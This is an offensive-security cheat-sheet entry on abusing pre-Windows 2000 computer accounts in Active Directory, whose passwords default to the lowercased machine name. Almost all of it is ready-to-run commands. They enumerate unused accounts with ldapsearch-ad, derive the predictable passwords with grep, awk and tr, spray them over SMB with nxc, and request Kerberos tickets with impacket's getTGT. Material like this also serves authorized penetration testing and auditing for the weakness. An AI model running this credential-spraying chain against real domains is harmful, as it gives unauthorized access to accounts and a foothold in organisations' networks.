---
technique: Pre-Windows 2000 Computer Accounts
category: builtins
targets: Pre-created Computer Accounts
protocols: SMB, Kerberos, LDAP
remote_capable: true
tags: builtins pre-win2000 computer-account password-predictable ldap smb kerberos foothold
---

# Pre-Windows 2000 Computer Accounts

Computer accounts manually pre-created in ADUC with the "pre-Windows 2000 computer" option have their password set to their lowercase computer name (without the trailing `$`). If these accounts have never been used (logonCount=0), the default password likely still applies. A `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` error during authentication confirms the correct password was found.

## Windows

No native tooling covers this attack end-to-end; see the Linux section.

## Linux

ldapsearch-ad finds eligible accounts and nxc validates credentials before getTGT obtains a ticket.

### Step 1: Find pre-Windows 2000 computer accounts (ldapsearch-ad)

#python #recon #ldap

Search for computer accounts with userAccountControl=4128 and logonCount=0, indicating never-used pre-created accounts.

```sh title:"Find pre-Windows 2000 computer accounts with logonCount=0 via ldapsearch-ad"
ldapsearch-ad -l "$rhost_ip" -d "$domain" -u "$user" -p "$pass" -t search -s '(&(userAccountControl=4128)(logonCount=0))' | tee results.txt
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
-->

### Step 2: Extract account names from results

#sh #native #recon

Parse the ldapsearch-ad output to produce a list of candidate computer account names.

```sh title:"Extract sAMAccountName values from ldapsearch-ad results"
grep "sAMAccountName" results.txt | awk '{print $4}' | tee computers.txt
```
<!-- cheat -->

### Step 3: Generate predictable passwords from account names

#sh #native #recon

Derive the expected passwords by lowercasing each account name and stripping the trailing dollar sign.

```sh title:"Generate predictable passwords from pre-Windows 2000 computer account names"
grep "sAMAccountName" results.txt | awk '{print tolower($4)}' | tr -d '$' | tee passwords.txt
```
<!-- cheat -->

### Step 4: Validate credentials (nxc)

#python #recon #smb #nxc

Spray the derived passwords against the matching account names to confirm which still use the default password.

```sh title:"Validate pre-Windows 2000 computer account credentials with NetExec"
nxc smb "$rhost_ip" -u computers.txt -p passwords.txt --no-bruteforce
```
<!-- cheat
import domain_ip
var dc_ip
-->

### getTGT (Kerberos auth without password change)

#python #kerberos #impacket

Obtain a TGT for a pre-Windows 2000 computer account using its predictable password without changing it.

```sh title:"Get TGT for pre-Windows 2000 computer account with getTGT"
getTGT.py "$domain"/"$computer_name$":"$computer_pass"
```
<!-- cheat
import domain_ip
var computer_name
var computer_pass
-->
